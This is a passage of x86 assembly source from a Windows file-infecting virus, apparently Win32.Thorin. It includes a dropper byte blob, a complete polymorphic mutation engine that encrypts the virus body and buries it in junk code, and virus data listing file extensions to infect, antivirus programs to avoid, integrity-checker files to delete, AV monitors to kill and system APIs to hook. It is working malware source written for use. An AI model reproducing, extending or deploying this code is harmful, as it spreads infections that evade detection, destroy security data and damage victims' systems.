	db      069h, 072h, 06Fh, 06Dh, 065h, 06Eh, 074h, 02Eh
	db      02Eh, 02Eh, 020h, 020h, 00Dh, 00Ah, 024h, 00Eh
	db      01Fh, 0B4h, 009h, 0CDh, 021h, 0C3h, 05Ah, 0E8h
	db      0F5h, 0FFh, 0B4h, 04Ch, 0CDh, 021h, 000h, 071h
	db      000h, 050h, 045h, 000h, 002h, 000h, 04Ch, 001h
	db      005h, 000h, 001h, 000h, 0ABh, 026h, 00Ah, 0B4h
	db      000h, 008h, 000h, 0E0h, 000h, 001h, 000h, 08Eh
	db      083h, 00Bh, 001h, 002h, 019h, 000h, 001h, 000h
	db      002h, 000h, 003h, 000h, 004h, 000h, 008h, 000h
	db      001h, 000h, 003h, 000h, 002h, 000h, 003h, 000h
	db      003h, 000h, 003h, 000h, 040h, 000h, 003h, 000h
	db      001h, 000h, 002h, 000h, 002h, 000h, 002h, 000h
	db      001h, 000h, 007h, 000h, 003h, 000h, 001h, 000h
	db      00Ah, 000h, 007h, 000h, 006h, 000h, 002h, 000h
	db      004h, 000h, 006h, 000h, 002h, 000h, 005h, 000h
	db      001h, 000h, 002h, 000h, 020h, 000h, 004h, 000h
	db      001h, 000h, 002h, 000h, 010h, 000h, 006h, 000h
	db      010h, 000h, 00Dh, 000h, 004h, 000h, 001h, 000h
	db      04Ch, 000h, 01Dh, 000h, 005h, 000h, 001h, 000h
	db      018h, 000h, 053h, 000h, 043h, 04Fh, 044h, 045h
	db      000h, 005h, 000h, 010h, 000h, 004h, 000h, 001h
	db      000h, 002h, 000h, 002h, 000h, 003h, 000h, 006h
	db      000h, 011h, 000h, 060h, 02Eh, 069h, 063h, 06Fh
	db      064h, 065h, 000h, 003h, 000h, 010h, 000h, 004h
	db      000h, 002h, 000h, 002h, 000h, 002h, 000h, 003h
	db      000h, 008h, 000h, 00Eh, 000h, 020h, 000h, 002h
	db      000h, 060h, 044h, 041h, 054h, 041h, 000h, 005h
	db      000h, 010h, 000h, 004h, 000h, 003h, 000h, 006h
	db      000h, 00Ah, 000h, 00Eh, 000h, 040h, 000h, 002h
	db      000h, 0C0h, 02Eh, 069h, 064h, 061h, 074h, 061h
	db      000h, 003h, 000h, 010h, 000h, 004h, 000h, 004h
	db      000h, 002h, 000h, 002h, 000h, 003h, 000h, 00Ah
	db      000h, 00Eh, 000h, 040h, 000h, 002h, 000h, 0C0h
	db      02Eh, 072h, 065h, 06Ch, 06Fh, 063h, 000h, 003h
	db      000h, 010h, 000h, 004h, 000h, 005h, 000h, 002h
	db      000h, 002h, 000h, 003h, 000h, 00Ch, 000h, 00Eh
	db      000h, 040h, 000h, 002h, 000h, 050h, 000h, 040h
	db      003h, 0FFh, 035h, 008h, 000h, 001h, 000h, 043h
	db      000h, 001h, 000h, 0E8h, 0F5h, 0FFh, 000h, 0F7h
	db      001h, 0FFh, 025h, 028h, 000h, 001h, 000h, 044h
	db      000h, 007h, 002h, 030h, 000h, 001h, 000h, 004h
	db      000h, 001h, 000h, 028h, 000h, 001h, 000h, 004h
	db      000h, 015h, 000h, 03Eh, 000h, 001h, 000h, 004h
	db      000h, 005h, 000h, 04Bh, 045h, 052h, 04Eh, 045h
	db      04Ch, 033h, 032h, 02Eh, 064h, 06Ch, 06Ch, 000h
	db      004h, 000h, 045h, 078h, 069h, 074h, 050h, 072h
	db      06Fh, 063h, 065h, 073h, 073h, 000h, 0B7h, 001h
	db      001h, 000h, 001h, 000h, 00Ch, 000h, 003h, 000h
	db      002h, 030h, 000h, 004h, 000h, 002h, 000h, 001h
	db      000h, 00Ch, 000h, 003h, 000h, 002h, 030h, 000h
	db      0E2h, 01Eh
dropper_size equ ($-offset dropper)

; ===========================================================================
; [THME] - The Hobbit Mutation Engine
; ===========================================================================
;
; ?????????????? ???????????????????????????????????????????» ??????????????
; ???????????????? ??? ??????? ??   ?? ???????? ??????? ??? ????????????????
; ??????????????   ??    ???   ??????? ?? ?? ?? ??????   ??   ??????????????
; ??????????????   ??    ???   ??????? ?? ?? ?? ??????   ??   ??????????????
; ???????????????» ???   ???   ??   ?? ?? ?? ?? ??????? ??? ????????????????
; ?????????????? ???????????????????????????????????????????? ??????????????
;
;
; This is a little polymorphic engine dessigned for my Win32.Thorin v1.00 vi-
; rus. It isn't very powerful, as it wasn't dessigned to be an unreachable
; engine, because the virus is enough big without poly, so i didn't wanted it
; to grow too much. It isn't my first poly engine for Win32 enviroments, but
; it is the first one i finished (and the simplest one). It is messy, unopti-
; mized, etc. But let me talk about its features:
;
; ? Non-realistic code (copro used, etc)
; ? Able of use any register (except ESP) as Pointer, Counter, and Delta.
; ? Crypt operations : ADD/SUB/XOR
; ? Garbage generator abilities:
;   - CALLs to subroutines (can be recursive)
;   - Arithmetic operations REG32/REG32
;   - Arithmetic operations REG32/IMM32
;   - Arithmetic operations EAX32/IMM32
;   - MOV reg32,reg32/imm32
;   - MOV reg16,reg16/imm16
;   - PUSH/Garbage/POP structures
;   - Coprocessor opcodes
;   - Simple onebyters
; ? Encryptor fixed size, 2048 bytes.
;
; I coded this engine in a record time ;) Pfff, maaaany improvements could be
; made, i know, but i think there will be another versions of the virus, so i
; will try to fix bugs (if any) and improve the junk generation, that is very
; weak, as well as the encryption is.
;
; input:
;       ECX = Size of code to encrypt/4
;       ESI = Pointer to the data to encrypt
;       EDI = Buffer where the decryptor+encrypted virus body will go
;       EBP = Delta Offset
; output:
;       ECX = Decryptor size
;
;       All the other registers, preserved.
;

LIMIT           equ     400h                    ; Decryptor size

RECURSION       equ     05h                     ; The recursion level of THME

_EAX            equ     00000000b               ; All these are the numeric
_ECX            equ     00000001b               ; value of all the registers.
_EDX            equ     00000010b               ; Heh, i haven't used here 
_EBX            equ     00000011b               ; all this, but... wtf? they
_ESP            equ     00000100b               ; don't waste bytes, and ma-
_EBP            equ     00000101b               ; ke this shit to be more
_ESI            equ     00000110b               ; clear :)
_EDI            equ     00000111b               ;

; [ PUSHAD structure ]

PUSHAD_EDI      equ     00h
PUSHAD_ESI      equ     04h
PUSHAD_EBP      equ     08h
PUSHAD_ESP      equ     0Ch
PUSHAD_EBX      equ     10h
PUSHAD_EDX      equ     14h
PUSHAD_ECX      equ     18h
PUSHAD_EAX      equ     1Ch

RETURN_ADDRESS  equ     04h

; [ THME_CryptOp ]

_XOR            equ     00000001b               ; XOR / XOR \
_ADD            equ     00000010b               ; ADD / SUB  >  Base crypt
_SUB            equ     00000100b               ; SUB / ADD /

; mamamamamama weer creezy now...

salc            equ     

THME            proc
	pushad
	call    THME_InitVariables              ; Initialize poly engine

	call    THME_BunchOfShit                ; Garbage!

	mov     eax,sTHME_Decrypt1              ; Get decryptor order in its
	call    r_range                         ; first part
	lea     esi,[ebp+THME_Decrypt1+eax*4]
	lodsd
	add     eax,ebp
	xchg    eax,esi

	mov     ecx,3                           ; Generate real instruction
THME_BuildIt:                                   ; plus some garbage
	lodsd
	add     eax,ebp
	push    esi ecx
	call    eax
	call    THME_BunchOfShit
	pop     ecx esi
	loop    THME_BuildIt

	call    THME_BunchOfShit                ; Generate the last part of
	call    THME_StoreLoop                  ; the poly
	call    THME_BunchOfShit
	call    THME_GenCryptOperations
	call    THME_BunchOfShit
	call    THME_GenIncPointer
	call    THME_BunchOfShit
	call    THME_GenDecCounter
	call    THME_GenLoop
	call    THME_BunchOfShit

	mov     al,0E9h                         ; Generate the JMP to the 
	stosb                                   ; decrypted virus code
	mov     eax,LIMIT
	mov     ebx,edi
	sub     ebx,dword ptr [ebp+THME_Pointer]
	add     ebx,04h
	sub     eax,ebx
	stosd

	xchg    eax,ecx                         ; Fill with shit the rest
THME_FillTheRest:
	call    random
	stosb
	loop    THME_FillTheRest
	
	call    THME_CryptData

	call    THME_ClosePoly
	popad
	ret

	db      00h,"[THME v1.00]",00h

THME_InitVariables:
	mov     dword ptr [ebp+THME_Pointer],edi ; Save all given data
	mov     dword ptr [ebp+THME_Data2crypt],esi
	mov     dword ptr [ebp+THME_S2C_div4],ecx
	and     byte ptr [ebp+THME_Recursion],00h
THME_IV_GetCounter:                             ; Get a valid register for
	mov     eax,08h                         ; use as counter
	call    r_range
	or      eax,eax
	jz      THME_IV_GetCounter
	cmp     eax,_ESP
	jz      THME_IV_GetCounter
	mov     byte ptr [ebp+THME_CounterReg],al
	mov     ebx,eax
THME_IV_GetPointer:                             ; Get a valid register for
	mov     eax,08h                         ; use as a pointer
	call    r_range
	or      eax,eax
	jz      THME_IV_GetPointer
	cmp     eax,_ESP
	jz      THME_IV_GetPointer
	cmp     eax,ebx
	jz      THME_IV_GetPointer
	mov     byte ptr [ebp+THME_PointerReg],al
	mov     ecx,eax

THME_IV_GetDelta:                               ; Get a valid register for 
	mov     eax,08h                         ; use as delta
	call    r_range
	or      eax,eax
	jz      THME_IV_GetDelta
	cmp     eax,_ESP
	jz      THME_IV_GetDelta
	cmp     eax,ebx
	jz      THME_IV_GetDelta
	cmp     eax,ecx
	jz      THME_IV_GetDelta
	mov     byte ptr [ebp+THME_DeltaReg],al

	call    random                          ; Get math operation for crypt
	and     al,00000111b
	mov     byte ptr [ebp+THME_CryptOp],al
	
	mov     dword ptr [edi],"EMHT"          ; Mark :)
	ret

THME_ClosePoly:                                 ; Return in ECX the size of
	mov     ecx,edi                         ; the engine (not needed)
	sub     ecx,dword ptr [ebp+THME_Pointer]
	mov     [esp.RETURN_ADDRESS.PUSHAD_ECX],ecx     
	ret

; THME_GETREGISTER
;
; input:
;       Nothing.
; output:
;       AL = Register unused by the decryptor
;

THME_GetRegister:                               
	movzx   ebx,byte ptr [ebp+THME_CounterReg]
	movzx   ecx,byte ptr [ebp+THME_PointerReg]
	movzx   edx,byte ptr [ebp+THME_DeltaReg]
THME_GR_GetIt:
	mov     eax,08h                         ; Get a register
	call    r_range
	cmp     eax,_ESP                        ; Mustn't be ESP
	jz      THME_GR_GetIt
	cmp     eax,ebx                         ; Mustn't be equal to counter
	jz      THME_GR_GetIt
	cmp     eax,ecx                         ; Mustn't be equal to pointer
	jz      THME_GR_GetIt
	cmp     eax,edx                         ; Mustn't be equal to delta
	jz      THME_GR_GetIt
	ret

; Garbage generator (recursion depht = 3)

THME_GenGarbage:
	inc     byte ptr [ebp+THME_Recursion]   ; Increase recursivity
	cmp     byte ptr [ebp+THME_Recursion],RECURSION ; Over our limit?
	jae     THME_GG_Exit                    ; Shitz...

	mov     eax,sTHME_GBG_Table             ; Select a garbage generator
	call    r_range                         ; from our table
	lea     ebx,[ebp+THME_GBG_Table]
	mov     eax,[ebx+eax*4]
	add     eax,ebp
	call    eax                             ; Call it

THME_GG_Exit:
	dec     byte ptr [ebp+THME_Recursion]   ; Decrease recursion level
	ret

; Call 6 times to the garbage generator

THME_BunchOfShit:
	mov     ecx,0Ch
THME_BOS_Loop:
	push    ecx
	call    THME_GenGarbage
	pop     ecx
	loop    THME_BOS_Loop
	ret

; THME_GBGB_GETVALIDRIB
;
; input:
;       Nothing.
; output:
;       AL = RegInfoByte that could be used for garbage regxx/regxx
;

THME_GBG_GetValidRiB:
	xor     eax,eax
	call    THME_GetRegister                ; Get a valid register for be
	mov     ecx,eax                         ; the target
	shl     eax,3
	push    eax
THME_GBG_GVRiB:
	mov     eax,8                           ; Get any register for be used
	call    r_range                         ; as source
	cmp     eax,ecx
	jz      THME_GBG_GVRiB                  ; Can't be source=target
	xchg    ebx,eax
	pop     eax
	add     eax,ebx
	add     al,11000000b                    ; Fix this 
	ret

; ---

THME_GBG_Arithmetic_EAX_IMM32:
	call    random
	and     al,00111000b                    ; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP
	or      al,00000101b            
	stosb
	call    random
	stosd
	ret

THME_GBG_Arithmetic_REG32_REG32:
	call    random
	and     al,00111000b                    ; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP
	or      al,00000011b    
	stosb
THME_GBG_A_R32_R32_GR:
	call    THME_GetRegister                ; Don't use EAX
	or      al,al
	jz      THME_GBG_A_R32_R32_GR
	shl     eax,3
	add     al,11000000b
	push    eax
	call    random
	and     al,00000111b
	xchg    ebx,eax
	pop     eax
	add     al,bl
	stosb
	ret 

THME_GBG_Arithmetic_REG32_IMM32:
	mov     al,81h                          ; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP
	stosb
THME_GBG_A_R32_I32_GR:
	call    THME_GetRegister
	or      al,al
	jz      THME_GBG_A_R32_I32_GR
	push    eax
	call    random       
	and     al,00111000b
	add     al,11000000b
	pop     ebx
	add     al,bl
	stosb
	call    random
	stosd
	ret

THME_GBG_GenOneByter:                   
	mov     eax,sTHME_OneByters             ; NOP/LAHF/INC EAX/DEC EAX/STI/CLD/
	call    r_range                         ; CMC/STC/CLC
	mov     al,[ebp+THME_OneByters+eax]
	stosb
	ret

THME_GBG_GenCopro:
	cmp     byte ptr [ebp+THME_CoproInit],00h ; If first call, put a FINIT
	jz      THME_GC_GenFINIT        
	mov     eax,sTHME_OneByters             ; If not, put any copro opcode
	call    r_range

	lea     ebx,[ebp+THME_Copro]
	movzx   eax,word ptr [ebx+eax*2]
	stosw
	ret

THME_GC_GenFINIT:
	inc     byte ptr [ebp+THME_CoproInit]
	mov     ax,0E3DBh                       ; FINIT
	stosw
	ret

THME_GBG_MOV_REG16_REG16:
	mov     al,66h                          ; MOV ?X,?X
	stosb
	call    THME_GBG_GetValidRiB
	push    eax
	mov     al,08Bh
	stosb
	pop     eax
	stosb
	ret

THME_GBG_MOV_REG16_IMM16:
	mov     al,66h                          ; MOV ?X,????
	stosb
	call    THME_GetRegister
	add     al,0B8h
	stosb
	call    random
	stosw
	ret

THME_GBG_MOV_REG32_REG32:
	call    THME_GBG_GetValidRiB            ; MOV E??,E??
	push    eax
	mov     al,8Bh
	stosb
	pop     eax
	stosb
	ret

THME_GBG_MOV_REG32_IMM32:
	call    THME_GetRegister                ; MOV E??,????????
	add     al,0B8h
	stosb
	call    random
	stosd
	ret

THME_GBG_GenPUSHPOP:                            ; PUSH E??
	mov     eax,8                           ; ...
	call    r_range                         ; POP E??
	add     al,50h
	stosb
	call    THME_GenGarbage
	call    THME_GetRegister
	add     al,58h
	stosb
	ret

THME_GBG_GenCALL_Type1:                         ; CALL @@1
	mov     al,0E8h                         ; ...
	stosb                                   ; JMP @@2
	xor     eax,eax                         ; ...
	stosd                                   ; @@1:
	push    edi                             ; ...
	call    THME_GenGarbage                 ; RET
	mov     al,0E9h                         ; ...
	stosb                                   ; @@2:
	xor     eax,eax                         ; ...
	stosd
	push    edi
	call    THME_GenGarbage
	mov     al,0C3h
	stosb
	call    THME_GenGarbage
	mov     ebx,edi
	pop     edx
	sub     ebx,edx
	mov     [edx-4],ebx
	pop     ecx
	sub     edx,ecx
	mov     [ecx-4],edx
	ret       

; ---

THME_CryptData:                         ; Encrypt given data with proper operation
	mov     esi,dword ptr [ebp+THME_Data2crypt]
	mov     edi,esi
	mov     ecx,dword ptr [ebp+THME_S2C_div4]
THME_CD_EncryptLoop:
	lodsd
	push    ecx
	call    THME_DoCryptOperations
	pop     ecx
	stosd
	loop    THME_CD_EncryptLoop
	ret

THME_DoCryptOperations:
	test    byte ptr [ebp+THME_CryptOp],_XOR
	jz      THME_DCO_XOR
	test    byte ptr [ebp+THME_CryptOp],_ADD
	jz      THME_DCO_ADD
THME_DCO_SUB:
	add     eax,dword ptr [ebp+THME_Key1]
	jmp     THME_DCO_EXIT
THME_DCO_ADD:
	sub     eax,dword ptr [ebp+THME_Key1]
	jmp     THME_DCO_EXIT
THME_DCO_XOR:
	xor     eax,dword ptr [ebp+THME_Key1]
THME_DCO_EXIT:
	ret

; ---

THME_GenDeltaOffset:                            ; CALL @@1
	mov     eax,10h                         ; ...
	call    r_range                         ; @@1:
	xchg    eax,ebx                         ; POP E??
	mov     al,0E8h
	stosb
	xor     eax,eax
	stosd
	mov     dword ptr [ebp+THME_GDO_TmpCll],edi
	call    THME_GenGarbage
	mov     ecx,dword ptr [ebp+THME_GDO_TmpCll]
	mov     ebx,edi
	sub     ebx,ecx
	mov     [ecx-4],ebx
	mov     al,58h
	add     al,byte ptr [ebp+THME_DeltaReg]
	stosb
	mov     ebx,dword ptr [ebp+THME_Pointer]
	sub     ecx,ebx
	mov     dword ptr [ebp+THME_Fix1],ecx
	ret

THME_GenLoadSize:
	mov     eax,2
	call    r_range
	xchg    eax,ecx
	jecxz   THME_GLS_@@2
THME_GLS_@@1:
	mov     al,68h                          ; PUSH ????????
						; ...
	stosb                                   ; POP E??
	mov     eax,dword ptr [ebp+THME_S2C_div4]
	stosd
	call    THME_GenGarbage
	mov     al,58h
	add     al,byte ptr [ebp+THME_CounterReg]
	stosb
	ret
THME_GLS_@@2:
	movzx   eax,byte ptr [ebp+THME_CounterReg]
	add     eax,0B8h                        ; MOV E??,????????
	stosb
	mov     eax,dword ptr [ebp+THME_S2C_div4]
	stosd
	ret

THME_GenLoadPointer:
	mov     al,8Dh                          ; LEA E??,[E??+????????]
	stosb
	movzx   eax,byte ptr [ebp+THME_PointerReg]
	shl     al,3
	add     al,10000000b
	add     al,byte ptr [ebp+THME_DeltaReg]
	stosb
	mov     eax,LIMIT
	sub     eax,dword ptr [ebp+THME_Fix1]
	stosd
	ret

THME_StoreLoop:
	mov     dword ptr [ebp+THME_LoopAddress],edi
	ret

THME_GenCryptOperations:
	mov     al,81h
	stosb
	test    byte ptr [ebp+THME_CryptOp],_XOR
	jz      THME_GCO_XOR
	test    byte ptr [ebp+THME_CryptOp],_ADD
	jz      THME_GCO_ADD
THME_GCO_SUB:
	mov     al,28h                          ; SUB [E??],????????
	jmp     THME_GCO_BuildRiB
THME_GCO_ADD:
	xor     al,al                           ; ADD [E??],????????
	jmp     THME_GCO_BuildRiB
THME_GCO_XOR:
	mov     al,30h                          ; XOR [E??],????????
THME_GCO_BuildRiB:
	add     al,byte ptr [ebp+THME_PointerReg]
	cmp     byte ptr [ebp+THME_PointerReg],_EBP
	jnz     THME_GCO_BR_NoEBP
	or      al,01000000b
	stosb
	xor     al,al
	stosb
	jmp     $+3
THME_GCO_BR_NoEBP:
	stosb
	call    random
	mov     dword ptr [ebp+THME_Key1],eax
	stosd
THME_GCO_EXIT:
	ret

THME_GenIncPointer:
	mov     eax,5
	call    r_range
	xchg    eax,ecx
	jecxz   THME_GIP_@@2
	dec     ecx
	jecxz   THME_GIP_@@3
	dec     ecx
	jecxz   THME_GIP_@@4
	dec     ecx
	jnz     THME_GIP_@@1
	jmp     THME_GIP_@@5

THME_GIP_@@1:
	mov     bl,4                            ; ADD E??,4
	call    THME_GIP_AddIt
	jmp     THME_GIP_EXIT

THME_GIP_@@2:
	mov     eax,2                   
	call    r_range
	xchg    eax,ecx
	jecxz   THME_GIP_@@2_@@2
THME_GIP_@@2_@@1:
	mov     bl,3                            ; ADD E??,3
	call    THME_GIP_AddIt
	mov     bl,1                            ; INC E??
	call    THME_GIP_IncIt
	jmp     THME_GIP_@@2_EXIT
THME_GIP_@@2_@@2:
	mov     bl,1                            ; INC E??
	call    THME_GIP_IncIt
	mov     bl,3
	call    THME_GIP_AddIt                  ; ADD E??,3
THME_GIP_@@2_EXIT:
	jmp     THME_GIP_EXIT

THME_GIP_@@3:
	mov     eax,2
	call    r_range
	xchg    eax,ecx
	jecxz   THME_GIP_@@3_@@2
THME_GIP_@@3_@@1:
	mov     bl,2                            ; ADD E??,2
	call    THME_GIP_AddIt
	mov     bl,2                            ; INC E??
	call    THME_GIP_IncIt                  ; INC E??
	jmp     THME_GIP_@@2_EXIT
THME_GIP_@@3_@@2:
	mov     bl,2                            ; INC E??
	call    THME_GIP_IncIt                  ; INC E??
	mov     bl,2                            ; ADD E??,2
	call    THME_GIP_AddIt
	jmp     THME_GIP_@@2_EXIT

THME_GIP_@@4:
	mov     eax,2
	call    r_range
	xchg    eax,ecx
	jecxz   THME_GIP_@@4_@@2
THME_GIP_@@4_@@1:
	mov     bl,1                            ; ADD E??,1
	call    THME_GIP_AddIt                  ; INC E??
	mov     bl,3                            ; INC E??
	call    THME_GIP_IncIt                  ; INC E??
	jmp     THME_GIP_@@2_EXIT
THME_GIP_@@4_@@2:
	mov     bl,1                            ; INC E??
	call    THME_GIP_IncIt                  ; INC E??
	mov     bl,3                            ; INC E??
	call    THME_GIP_AddIt                  ; ADD E??,1
	jmp     THME_GIP_@@2_EXIT

THME_GIP_@@5:                                   ; INC E??
	mov     bl,4                            ; INC E??
	call    THME_GIP_IncIt                  ; INC E??
						; INC E??

THME_GIP_EXIT:
	ret

THME_GIP_AddIt:
	mov     al,83h
	stosb
	mov     al,byte ptr [ebp+THME_PointerReg]
	or      al,11000000b
	stosb
	mov     al,bl
	stosb
	ret

THME_GIP_IncIt:
	movzx   ecx,bl
	mov     al,40h
	add     al,byte ptr [ebp+THME_PointerReg]
THME_GIP_II_Loop:
	stosb
	pushad
	call    THME_GenGarbage
	popad
	loop    THME_GIP_II_Loop
	ret

THME_GenDecCounter:
	mov     eax,3
	call    r_range
	xchg    eax,ecx
	jecxz   THME_GDC_@@2
	dec     ecx
	jecxz   THME_GDC_@@3
THME_GDC_@@1:                                   ; SUB E??,1
	mov     al,83h
	stosb
	mov     al,byte ptr [ebp+THME_CounterReg]
	or      al,11101000b
	stosb
	mov     al,1
	stosb
	jmp     THME_GDC_EXIT
THME_GDC_@@2:
	mov     al,48h                          ; DEC E??
	add     al,byte ptr [ebp+THME_CounterReg]
	stosb
	jmp     THME_GDC_EXIT
THME_GDC_@@3:
	mov     al,83h                          ; ADD E??,-1
	stosb
	mov     al,byte ptr [ebp+THME_CounterReg]
	or      al,11000000b
	stosb
	mov     al,0FFh
	stosb
THME_GDC_EXIT:
	ret

THME_GenLoop:
	mov     ax,850Fh                        ; JNZ FAR ????????
	stosw
	mov     eax,dword ptr [ebp+THME_LoopAddress]
	sub     eax,edi
	sub     eax,00000004h
	stosd
	ret

THME_OneByters  label   byte
	cld
	cmc
	clc
	stc
	dec     eax
	inc     eax
	lahf
	nop
	salc
sTHME_OneByters equ     ($-THME_OneByters)

THME_Copro      label   byte
	f2xm1
	fabs
	fadd
	faddp
	fchs
	fnclex
	fcom
	fcomp
	fcompp
	fcos
	fdecstp
	fdiv
	fdivp
	fdivr
	fdivrp
	ffree
	fincstp
	fld1
	fldl2t
	fldl2e
	fldpi
	fldln2
	fldz
	fmul
	fmulp
	fnclex
	fnop
	fpatan
	fprem
	fprem1
	fptan
	frndint
	fscale
	fsin
	fsincos
	fsqrt
	fst
	fstp
	fsub
	fsubp
	fsubr
	fsubrp
	ftst
	fucom
	fucomp
	fucompp
	fxam
	fxtract
	fyl2x
	fyl2xp1
sTHME_Copro     equ     (($-THME_Copro)/2)

; Possibilities before crypt operation

THME_Decrypt1   label   byte
	dd      offset (THME_Decrypt1a)
	dd      offset (THME_Decrypt1b)
	dd      offset (THME_Decrypt1c)
sTHME_Decrypt1  equ     (($-THME_Decrypt1)/4)

THME_Decrypt1a  label   byte
	dd      offset (THME_GenDeltaOffset)
	dd      offset (THME_GenLoadSize)
	dd      offset (THME_GenLoadPointer)
sTHME_Decrypt1a equ     (($-THME_Decrypt1a)/4)

THME_Decrypt1b  label   byte
	dd      offset (THME_GenDeltaOffset)
	dd      offset (THME_GenLoadPointer)
	dd      offset (THME_GenLoadSize)
sTHME_Decrypt1b equ     (($-THME_Decrypt1b)/4)

THME_Decrypt1c  label   byte
	dd      offset (THME_GenLoadSize)
	dd      offset (THME_GenDeltaOffset)
	dd      offset (THME_GenLoadPointer)
sTHME_Decrypt1c equ     (($-THME_Decrypt1c)/4)

; Main table (for garbage generation)

THME_GBG_Table  label   byte
	dd      offset (THME_GBG_Arithmetic_EAX_IMM32)
	dd      offset (THME_GBG_Arithmetic_REG32_REG32)
	dd      offset (THME_GBG_Arithmetic_REG32_IMM32)
	dd      offset (THME_GBG_MOV_REG16_REG16)
	dd      offset (THME_GBG_MOV_REG16_IMM16)
	dd      offset (THME_GBG_MOV_REG32_REG32)
	dd      offset (THME_GBG_MOV_REG32_IMM32)
	dd      offset (THME_GBG_GenOneByter)
	dd      offset (THME_GBG_GenCopro)
	dd      offset (THME_GBG_GenPUSHPOP)
	dd      offset (THME_GBG_GenCALL_Type1)
sTHME_GBG_Table equ     (($-THME_GBG_Table)/4)

thme_end        label   byte

THME            endp

; ===========================================================================
; Random procedures 
; ===========================================================================
;
; RANDOM
;
; input:
;       Nothing.
; output:
;       EAX = Random number
;

random          proc                            ; Thanx MDriller! ;)
	push    ecx
	mov     eax,dword ptr [ebp+rnd_seed1]
	dec     dword ptr [ebp+rnd_seed1]
	xor     eax,dword ptr [ebp+rnd_seed2]
	mov     ecx,eax
	rol     dword ptr [ebp+rnd_seed1],cl
	add     dword ptr [ebp+rnd_seed2],eax
	adc     eax,dword ptr [ebp+rnd_seed2]
	add     eax,ecx
	ror     eax,cl
	not     eax
	sub     eax,3
	xor     dword ptr [ebp+rnd_seed2],eax
	xor     eax,dword ptr [ebp+rnd_seed3]
	rol     dword ptr [ebp+rnd_seed3],1
	sub     dword ptr [ebp+rnd_seed3],ecx
	sbb     dword ptr [ebp+rnd_seed3],4
	inc     dword ptr [ebp+rnd_seed2]
	pop     ecx
	ret
random          endp

; R_RANGE
;
; input:
;       EAX = Number of possible random numbers
; output:
;       EAX = Number between 0 and (EAX-1)

r_range         proc
	push    ecx
	push    edx
	mov     ecx,eax
	call    random
	xor     edx,edx
	div     ecx
	mov     eax,edx
	pop     edx
	pop     ecx
	ret
r_range         endp

; ===========================================================================
; Virus data
; ===========================================================================
; I went to god just to see, and i was looking at me.

_MASK           db      "*."
EXTENSION       dd      00000000h

EXTENSIONS      db      "EXE",0                 ; Nice table: very easy to 
		db      "SCR",0                 ; add new extensions to infect
		db      "CPL",0
n_EXT           equ     (($-offset EXTENSIONS)/4)

ALL_MASK        db      "*.*",0

dotdot          db      "..",0
root            db      "c:\",0                 ; Don't be afraid... :)

key_mIRC        db      "iKX\Thorin\mIRC32",0
key_PIRCH       db      "iKX\Thorin\Pirch32",0
key_ViRC97      db      "iKX\Thorin\ViRC97",0

; Whoaaaaa... many many many payloads! 

payload_table   label   byte
		dd      offset (payload1)
		dd      offset (payload2)
		dd      offset (payload3)
		dd      offset (payload4)
		dd      offset (payload5)
payload_number  equ     (($-offset payload_table)/4)

infections      dd      00000000h
imagebase       dd      imagebase_
kernel          dd      kernel_

K32_DLL         db      "KERNEL32.dll",0
K32_Size        equ     $-K32_DLL

szSHELL32       db      "SHELL32",0
szUSER32        db      "USER32",0
szADVAPI32      db      "ADVAPI32",0

szOPEN          db      "OPEN",0
szMicro$oft     db      "http://www.microsoft.com",0    ; Yaaaaaaargh!!!

; @@BadProgramz structure
; ???????????????????????
;       +02h    String Size
;       +??h    First letters (string size) of files we don't want to be infected

@@BadProgramz           label   byte
			db      02h,"TB"        ; ThunderByte?
			db      02h,"F-"        ; F-Prot?
			db      03h,"NAV"       ; Norton Antivirus?
			db      03h,"AVP"       ; AVP?
			db      03h,"WEB"       ; DrWeb?
			db      03h,"PAV"       ; Panda?
			db      03h,"DRW"       ; DrWeb?
			db      04h,"DSAV"      ; Dr Solomon?
			db      03h,"NOD"       ; Nod-Ice?
			db      06h,"WINICE"    ; SoftIce?
			db      06h,"FORMAT"    ; Format?
			db      05h,"FDISK"     ; Fdisk?
			db      08h,"SCANDSKW"  ; ScanDisk?
			db      06h,"DEFRAG"    ; Defrag?
			db      0BBh

@@BadPhilez             label   byte            ; Files to delete in all dirz
ANTIVIR_DAT             db      "ANTI-VIR.DAT",0
CHKLIST_DAT             db      "CHKLIST.DAT",0
CHKLIST_TAV             db      "CHKLIST.TAV",0
CHKLIST_MS              db      "CHKLIST.MS",0
CHKLIST_CPS             db      "CHKLIST.CPS",0
AVP_CRC                 db      "AVP.CRC",0
IVB_NTZ                 db      "IVB.NTZ",0
SMARTCHK_MS             db      "SMARTCHK.MS",0
SMARTCHK_CPS            db      "SMARTCHK.CPS",0

Monitors2Kill           label   byte
			db      "AVP Monitor",0
			db      "Amon Antivirus Monitor",0
			db      0BBh


; @@Hookz structure
; ?????????????????
;       +00h    API Name
;       +??h    Bytes from beginning of virus until beginning of hook handler

@@Hookz                 label   byte
?szMoveFileA            db      "MoveFileA",0
?hnMoveFileA            dd      (offset HookMoveFileA)

?szCopyFileA            db      "CopyFileA",0
?hnCopyFileA            dd      (offset HookCopyFileA)

?szGetFullPathNameA     db      "GetFullPathNameA",0
?hnGetFullPathNameA     dd      (offset HookGetFullPathNameA)

?szDeleteFileA          db      "DeleteFileA",0
?hnDeleteFileA          dd      (offset HookDeleteFileA)

?szWinExec              db      "WinExec",0
?hnWinExec              dd      (offset HookWinExec)

?szCreateProcessA       db      "CreateProcessA",0
?hnCreateProcessA       dd      (offset HookCreateProcessA)

?szCreateFileA          db      "CreateFileA",0
?hnCreateFileA          dd      (offset HookCreateFileA)

?szGetFileAttributesA   db      "GetFileAttributesA",0
?hnGetFileAttributesA   dd      (offset HookGetFileAttributesA)

?szFindFirstFileA       db      "FindFirstFileA",0
?hnFindFirstFileA       dd      (offset HookFindFirstFileA)

?szFindNextFileA        db      "FindNextFileA",0
?hnFindNextFileA        dd      (offset HookFindNextFileA)

?szHookGetProcAddress   db      "GetProcAddress",0
?hnHookGetProcAddress   dd      (offset HookGetProcAddress)

			db      ""             ; How funny ;)

@IsDebuggerPresent      db      "IsDebuggerPresent",0

; Hrm, i think i should write some compression engine for that API shit :)

@@Namez                 label   byte
@GetModuleHandleA       db      "GetModuleHandleA",0
@LoadLibraryA           db      "LoadLibraryA",0
@FindClose              db      "FindClose",0
@SetFilePointer         db      "SetFilePointer",0
@SetFileAttributesA     db      "SetFileAttributesA",0
@CloseHandle            db      "CloseHandle",0
@GetCurrentDirectoryA   db      "GetCurrentDirectoryA",0
